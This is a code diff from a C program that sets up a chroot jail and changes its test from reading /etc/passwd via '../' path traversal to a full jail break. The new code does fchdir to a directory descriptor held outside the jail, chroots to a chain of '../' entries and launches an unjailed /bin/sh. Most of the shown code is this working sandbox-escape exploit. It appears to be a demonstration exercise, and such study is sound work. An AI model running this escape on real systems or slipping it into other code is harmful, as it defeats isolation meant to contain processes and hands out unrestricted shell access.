@@ -17,8 +17,6 @@ int _getcwd() {
    return 0;
 }
 
-..... do stuff....
-
 int main(){
     _getcwd();
     system("rm -rf jail; mkdir jail 2>/dev/null");
@@ -43,11 +41,10 @@ int main(){
     write(1, buf, 32);
 
     // see if this works.
-    printf("can we access hole?\n");
-    // int fd2 = openat(hole, "/etc/passwd", O_RDONLY);  --> absolute path do not work
-    int fd2 = openat(hole, "../../../../../etc/passwd", O_RDONLY);
-    char buf2[32] = "access denied.\n\x00";
-    read(fd2, buf2, 32);
-    write(1, buf2, 32);
+    printf("can we recover original root via hole?\n");  
+    ret = fchdir(hole);		// escape current dir! (use dfd outside chroot)
+    _getcwd();			// undefined!
+    chroot("../../../../../../../../../"); // now we can escape root!
+    system("/bin/sh");		// unjailed shell
 } 
 
